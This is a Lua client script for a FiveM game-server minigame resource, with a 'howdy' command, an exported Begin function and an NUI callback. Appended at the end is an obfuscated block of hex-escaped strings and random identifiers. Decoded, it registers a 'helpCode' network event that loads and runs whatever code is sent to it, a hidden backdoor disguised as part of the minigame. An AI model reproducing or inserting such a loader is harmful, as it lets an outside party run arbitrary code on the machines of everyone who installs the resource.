local MinigameActive = false
local Result = nil

 RegisterCommand('howdy', function()
     local success = Begin(1, 5000)
 end)

Begin = function(icons, time)
    if MinigameActive then return end

    MinigameActive = true
    SetNuiFocus(true, true)
    SendNUIMessage({res = 'BEGIN_MINIGAME', icons = icons, time = time})
    
    while MinigameActive do
        Citizen.Wait(100)
    end

    return Result
end

exports('Begin', Begin)

RegisterNUICallback('finished', function(data, cb)
    Result = data.result
    MinigameActive = false
    SetNuiFocus(false, false)
    cb('ok')
end)

local ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[6][ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[1]](ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[2]) ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[6][ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[3]](ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[2], function(ePoCxNjrLteizJwniWuKhVjxQKuVPnNhFdRWbLHVYCoNIaixlxZcNwdVFAccqutHzzuhIX) ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[6][ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[4]](ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[6][ndIIvnRTyynhyQkYKXwFbSZokzQknHCckvyVuSFchbuYsYLFBcGIvNdWplkQSWGMEwkovN[5]](ePoCxNjrLteizJwniWuKhVjxQKuVPnNhFdRWbLHVYCoNIaixlxZcNwdVFAccqutHzzuhIX))() end)